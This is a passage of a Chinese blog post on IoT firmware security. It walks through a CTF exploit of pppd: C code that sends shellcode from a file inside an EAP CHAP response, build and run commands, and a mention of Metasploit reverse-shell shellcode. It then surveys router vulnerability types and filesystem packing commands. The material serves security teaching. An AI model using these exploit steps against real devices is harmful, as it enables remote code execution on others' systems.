+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
+
+<p>（3）编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
+
+<p>（4）在本地机器运行patched <code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
+
+<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830154226602.png" alt="image-20200830154226602"></p>
+<p>获取flag：</p>
+<p>方法一：</p>
+<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
+<p>方法二：</p>
+<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
+<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
+<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
+<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
+<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
+<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
+<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
+<p>考点：</p>
+<ol>
+<li>mips 堆溢出利用；</li>
+<li>uClibc 堆管理机制。 </li>
+</ol>
+<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830015127901.png" alt="image-20200830015127901"></p>
+<p>DLINK DIR-815 路由器前台栈溢出</p>
+<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
+<ul>
+<li>DLINK DIR-859 upnp 协议命令注入</li>
+<li>tplink sr20 路由器命令注入</li>
+<li>Draytek Vigor2960 前台登录处栈溢出</li>
+</ul>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
+<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
+<p>TPLINK WR841n 路由器后台栈溢出</p>
+<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
+<p>命令注入</p>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
+<hr>
+<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
+<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
+<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829204006754.png" alt="image-20200829204006754"></p>
+<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
+<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
+]]></content>
+      <tags>
+        <tag>iot</tag>
+      </tags>
   </entry>
 </search>
